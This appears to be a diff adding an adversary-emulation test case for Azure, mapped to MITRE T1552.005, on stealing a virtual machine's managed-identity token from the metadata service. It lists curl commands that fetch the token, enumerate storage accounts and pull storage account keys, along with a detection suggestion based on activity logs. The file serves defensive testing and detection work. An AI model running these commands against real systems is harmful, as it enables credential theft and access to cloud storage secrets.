@@ -1,0 +1,18 @@
+name: Virtual machine identity credential compromise
+description: Retrieve a virtual machine's identity credentials from the metadata service then interact with Azure APIs from another source
+platforms:
+- azure
+guidance:
+- "Request a token to interact with the management API\nshell> curl -H \"Metadata: true\" \"http://169.254.169.254/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"\n\nList storage accounts\nshell> curl -H \"Authorization: Bearer {{ jwt_token }}\" \"https://management.azure.com/subscriptions/{{ subscription_id }}/providers/Microsoft.Storage/storageAccounts?api-version=2021-04-01\"\n\nGet keys from a storage account\nshell> curl -H \"Authorization: Bearer {{ jwt_token }}\" -X POST -d \"Content-Length: 0\" \"https://management.azure.com/subscriptions/{{ subscription_id }}/resourceGroups/{{ resource_group_name }}/providers/Microsoft.Storage/storageAccounts/{{ storage_account_name }}/listKeys?api-version=2021-04-01\"\n"
+block:
+- ''
+detect:
+- Use Azure activity logs to detect when a principal performs actions from an unexpected source, such as a virtual machine's identity performing actions from a non-Azure IP
+controls:
+- SIEM
+metadata:
+  id: 4605314d-edb7-4948-bed9-675918aa0aca
+  tid: T1552.005
+  tactic: TA0006
+  x_vectr_id: 4605314d-edb7-4948-bed9-675918aa0aca
+  isv: 1
